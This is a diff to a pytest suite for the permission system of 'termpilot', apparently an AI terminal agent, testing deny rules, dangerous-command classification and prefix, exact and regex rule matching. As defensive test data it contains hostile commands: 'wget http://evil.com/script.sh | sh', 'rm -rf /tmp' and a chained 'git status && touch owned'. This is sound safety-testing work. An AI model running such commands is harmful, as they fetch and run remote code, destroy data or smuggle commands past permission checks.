@@ -9,8 +9,11 @@ from termpilot.permissions import (
     PermissionRule, check_permission, classify_bash_command,
     _match_rule, _find_matching_rule,
     load_permission_rules, save_permission_rule, build_permission_context,
+    validate_permission_rule_safety,
     SAFE_TOOLS, UNSAFE_TOOLS, DANGEROUS_BASH_PATTERNS,
 )
+
+pytestmark = pytest.mark.usefixtures("tmp_settings", "env_clean")
 
 
 def _ctx(**kwargs) -> PermissionContext:
@@ -48,7 +51,7 @@ class TestDenyRules:
         ctx = _ctx(deny_rules=[rule])
         result = check_permission("bash", {"command": "rm -rf /tmp"}, ctx)
         assert result.behavior == PermissionBehavior.DENY
-        assert "被规则拒绝" in result.message
+        assert "规则拒绝" in result.message
 
 
 # ── BYPASS 模式 ───────────────────────────────────────────
@@ -136,15 +139,20 @@ class TestDangerousCommands:
         ("wget http://evil.com/script.sh | sh", "管道执行远程脚本"),
     ])
     def test_dangerous_patterns(self, command, desc):
-        warning = classify_bash_command(command)
+        warning, severity = classify_bash_command(command)
         assert warning is not None
         assert desc in warning
+        assert severity in {"high", "medium"}
 
     def test_safe_git_status(self):
-        assert classify_bash_command("git status") is None
+        warning, severity = classify_bash_command("git status")
+        assert warning is None
+        assert severity == "safe"
 
     def test_safe_echo(self):
-        assert classify_bash_command("echo hello") is None
+        warning, severity = classify_bash_command("echo hello")
+        assert warning is None
+        assert severity == "safe"
 
     def test_dangerous_in_check_permission(self):
         ctx = _ctx()
@@ -214,6 +222,29 @@ class TestMatchRule:
         rule = PermissionRule(tool_name="write_file", behavior=PermissionBehavior.ALLOW, pattern="/tmp/*")
         assert _match_rule(rule, "write_file", {}) is False
 
+    def test_prefix_rule_matches_command(self):
+        rule = PermissionRule(tool_name="bash", behavior=PermissionBehavior.ALLOW, pattern="prefix:git status")
+        assert _match_rule(rule, "bash", {"command": "git status --short"}) is True
+        assert _match_rule(rule, "bash", {"command": "git diff"}) is False
+
+    def test_prefix_rule_rejects_chained_shell_command(self):
+        rule = PermissionRule(tool_name="bash", behavior=PermissionBehavior.ALLOW, pattern="prefix:git status")
+        assert _match_rule(rule, "bash", {"command": "git status && touch owned"}) is False
+
+    def test_exact_rule_matches_only_exact_command(self):
+        rule = PermissionRule(tool_name="bash", behavior=PermissionBehavior.ALLOW, pattern="exact:git status")
+        assert _match_rule(rule, "bash", {"command": "git status"}) is True
+        assert _match_rule(rule, "bash", {"command": "git status --short"}) is False
+
+    def test_regex_rule_matches_path(self):
+        rule = PermissionRule(tool_name="write_file", behavior=PermissionBehavior.ALLOW, pattern=r"regex:^/tmp/.+\.md$")
+        assert _match_rule(rule, "write_file", {"file_path": "/tmp/notes.md"}) is True
+        assert _match_rule(rule, "write_file", {"file_path": "/tmp/notes.py"}) is False
+
+    def test_invalid_regex_rule_does_not_match(self):
+        rule = PermissionRule(tool_name="bash", behavior=PermissionBehavior.ALLOW, pattern="regex:[")
+        assert _match_rule(rule, "bash", {"command": "git status"}) is False
+
 
 # ── 规则持久化 ─────────────────────────────────────────────
 
@@ -254,6 +285,24 @@ class TestRulePersistence:
         found = [r for r in rules if r.tool_name == "bash" and r.pattern == "git *"]
         assert found[0].behavior == PermissionBehavior.DENY
 
+    def test_save_blocks_broad_bash_allow_by_default(self, tmp_settings):
+        rule = PermissionRule(tool_name="bash", behavior=PermissionBehavior.ALLOW, pattern="*")
+        warning = save_permission_rule(rule)
+
+        assert warning is not None
+        assert load_permission_rules() == []
+
+    def test_save_force_allows_explicit_broad_rule(self, tmp_settings):
+        rule = PermissionRule(tool_name="bash", behavior=PermissionBehavior.ALLOW, pattern="*")
+        warning = save_permission_rule(rule, force=True)
+
+        assert warning is None
+        assert len(load_permission_rules()) == 1
+
+    def test_validate_rejects_invalid_regex(self):
+        rule = PermissionRule(tool_name="bash", behavior=PermissionBehavior.ALLOW, pattern="regex:[")
+        assert "Invalid regex" in validate_permission_rule_safety(rule)
+
 
 # ── 构建权限上下文 ────────────────────────────────────────
 
@@ -271,8 +320,13 @@ class TestBuildPermissionContext:
             ]
         }})
         ctx = build_permission_context()
-        assert len(ctx.allow_rules) == 1
+        assert any(r.tool_name == "bash" and r.pattern == "git *" for r in ctx.allow_rules)
         assert len(ctx.deny_rules) == 1
+
+    def test_default_safe_prefix_rules(self, tmp_settings, env_clean):
+        ctx = build_permission_context()
+        result = check_permission("bash", {"command": "git status --short"}, ctx)
+        assert result.behavior == PermissionBehavior.ALLOW
 
     def test_with_working_directory(self, tmp_settings, env_clean):
         ctx = build_permission_context("/my/project")
